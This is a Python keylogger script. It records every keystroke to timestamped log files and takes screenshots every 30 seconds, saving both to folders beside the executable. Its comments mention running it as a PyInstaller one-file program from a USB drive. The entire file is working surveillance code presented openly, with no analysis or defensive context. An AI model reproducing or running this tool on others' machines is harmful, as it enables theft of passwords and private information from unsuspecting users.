from pynput import keyboard
import logging
from datetime import datetime
import os
import sys
import threading
import pyautogui
import time

# Define root path (USB) next to .exe (for PyInstaller --onefile compatibility)
usb_root = os.path.dirname(os.path.abspath(sys.executable))

# Setup log folder
log_dir = os.path.join(usb_root, "logs")
os.makedirs(log_dir, exist_ok=True)

# Setup screenshot folder
screenshot_dir = os.path.join(usb_root, "screenshots")
os.makedirs(screenshot_dir, exist_ok=True)

# Create timestamped log file
timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
log_filename = os.path.join(log_dir, f"keylog_{timestamp}.txt")

# Configure logging
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s'
)

# Function to handle keystrokes
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        try:
            logging.info(f"<{key.name}>")
        except AttributeError:
            logging.info(f"<{key}>")
    
    # Flush log after every key
    for handler in logging.getLogger().handlers:
        handler.flush()

# Function to handle key release
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Function to capture screenshots periodically
def take_screenshots(interval=30):  # every 30 seconds
    while True:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filepath = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        try:
            pyautogui.screenshot(filepath)
        except Exception as e:
            logging.error(f"Screenshot error: {e}")
        time.sleep(interval)

# Start screenshot thread
screenshot_thread = threading.Thread(target=take_screenshots, daemon=True)
screenshot_thread.start()

# Start keylogger
print(f"Keylogger started. Logging to:\n{log_filename}")
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    logging.error(f"Error in listener: {e}")
